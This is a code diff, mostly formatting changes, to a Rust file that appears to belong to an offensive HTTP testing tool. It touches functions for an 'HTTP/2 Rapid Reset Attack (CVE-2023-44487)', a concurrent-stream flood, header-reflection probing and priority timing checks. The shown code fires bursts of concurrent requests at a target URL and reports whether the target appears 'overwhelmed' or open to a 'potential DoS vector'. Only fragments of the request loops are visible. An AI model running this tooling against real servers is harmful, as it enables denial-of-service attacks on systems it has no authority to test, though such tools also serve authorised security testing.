@@ -3,11 +3,18 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn rapidreset(url: &str, count: u32, rate: u32, timeout: u64) -> anyhow::Result<()> {
-    println!("{} HTTP/2 Rapid Reset Attack (CVE-2023-44487)", "[*]".cyan().bold());
+    println!(
+        "{} HTTP/2 Rapid Reset Attack (CVE-2023-44487)",
+        "[*]".cyan().bold()
+    );
     println!("{}", "=".repeat(60).cyan());
     println!("{} URL:    {}", "[*]".cyan().bold(), url);
     println!("{} Count:  {}", "[*]".cyan().bold(), count);
@@ -31,29 +38,47 @@ pub async fn rapidreset(url: &str, count: u32, rate: u32, timeout: u64) -> anyho
                 Err(_) => (0u16, false),
             }
         }));
-        if rate > 0 && sent % rate == 0 && sent > 0 {
+        if rate > 0 && sent.is_multiple_of(rate) && sent > 0 {
             tokio::time::sleep(Duration::from_millis(1000)).await;
         }
         sent += 1;
     }
 
     for h in handles {
-        if let Ok((status, ok)) = h.await {
-            if !ok { errors += 1; }
-        } else { errors += 1; }
+        if let Ok((_status, ok)) = h.await {
+            if !ok {
+                errors += 1;
+            }
+        } else {
+            errors += 1;
+        }
     }
 
     let elapsed = start.elapsed();
     println!("\n{} Results:", "[*]".cyan().bold());
     println!("  {} Requests sent:   {}", "*".cyan(), sent);
     println!("  {} Errors received: {}", "*".cyan(), errors);
-    println!("  {} Time elapsed:    {:.2}s", "*".cyan(), elapsed.as_secs_f64());
-    println!("  {} Effective rate:  {:.0} req/s", "*".cyan(), sent as f64 / elapsed.as_secs_f64());
+    println!(
+        "  {} Time elapsed:    {:.2}s",
+        "*".cyan(),
+        elapsed.as_secs_f64()
+    );
+    println!(
+        "  {} Effective rate:  {:.0} req/s",
+        "*".cyan(),
+        sent as f64 / elapsed.as_secs_f64()
+    );
 
     if errors > sent / 2 {
-        println!("  {} Target may be vulnerable or overwhelmed — high error rate.", "[!]".red().bold());
+        println!(
+            "  {} Target may be vulnerable or overwhelmed — high error rate.",
+            "[!]".red().bold()
+        );
     } else {
-        println!("  {} Target handled requests — may have mitigation in place.", "[-]".yellow().bold());
+        println!(
+            "  {} Target handled requests — may have mitigation in place.",
+            "[-]".yellow().bold()
+        );
     }
     Ok(())
 }
@@ -85,12 +110,28 @@ pub async fn stream(url: &str, count: u32, timeout: u64) -> anyhow::Result<()> {
     let mut err = 0u32;
     for h in handles {
         if let Ok((_, success)) = h.await {
-            if success { ok += 1; } else { err += 1; }
-        } else { err += 1; }
+            if success {
+                ok += 1;
+            } else {
+                err += 1;
+            }
+        } else {
+            err += 1;
+        }
     }
 
-    println!("\n{} {} streams OK, {} errors", "[*]".cyan().bold(), ok, err);
-    if ok > 100 { println!("{} Target allows high concurrent streams — potential DoS vector.", "[!]".red().bold()); }
+    println!(
+        "\n{} {} streams OK, {} errors",
+        "[*]".cyan().bold(),
+        ok,
+        err
+    );
+    if ok > 100 {
+        println!(
+            "{} Target allows high concurrent streams — potential DoS vector.",
+            "[!]".red().bold()
+        );
+    }
     Ok(())
 }
 
@@ -119,11 +160,25 @@ pub async fn header(url: &str, timeout: u64) -> anyhow::Result<()> {
             Ok(resp) => {
                 let status = resp.status().as_u16();
                 let body = resp.text().await.unwrap_or_default();
-                let reflected = body.contains(value) || body.contains("admin") || body.contains("internal");
-                let tag = if reflected { "REFLECTED".red().bold().to_string() } else { "no effect".to_string() };
-                println!("  {} {:25} = {:20} status={} {}", "*".cyan(), header, value, status, tag);
+                let reflected =
+                    body.contains(value) || body.contains("admin") || body.contains("internal");
+                let tag = if reflected {
+                    "REFLECTED".red().bold().to_string()
+                } else {
+                    "no effect".to_string()
+                };
+                println!(
+                    "  {} {:25} = {:20} status={} {}",
+                    "*".cyan(),
+                    header,
+                    value,
+                    status,
+                    tag
+                );
             }
-            Err(_) => { println!("  {} {:25} error", "*".red(), header); }
+            Err(_) => {
+                println!("  {} {:25} error", "*".red(), header);
+            }
         }
     }
     Ok(())
@@ -152,12 +207,24 @@ pub async fn priority(url: &str, timeout: u64) -> anyhow::Result<()> {
                 let elapsed = std::time::Instant::now();
                 let body = resp.text().await.unwrap_or_default();
                 let t = elapsed.elapsed();
-                println!("  {} {:30} status={} time={:.0}ms len={}", "*".cyan(), name, status, t.as_millis(), body.len());
+                println!(
+                    "  {} {:30} status={} time={:.0}ms len={}",
+                    "*".cyan(),
+                    name,
+                    status,
+                    t.as_millis(),
+                    body.len()
+                );
             }
-            Err(_) => { println!("  {} {:30} error", "*".red(), name); }
+            Err(_) => {
+                println!("  {} {:30} error", "*".red(), name);
+            }
         }
     }
 
-    println!("\n{} Look for response time differences indicating priority handling.", "[*]".cyan().bold());
+    println!(
+        "\n{} Look for response time differences indicating priority handling.",
+        "[*]".cyan().bold()
+    );
     Ok(())
 }
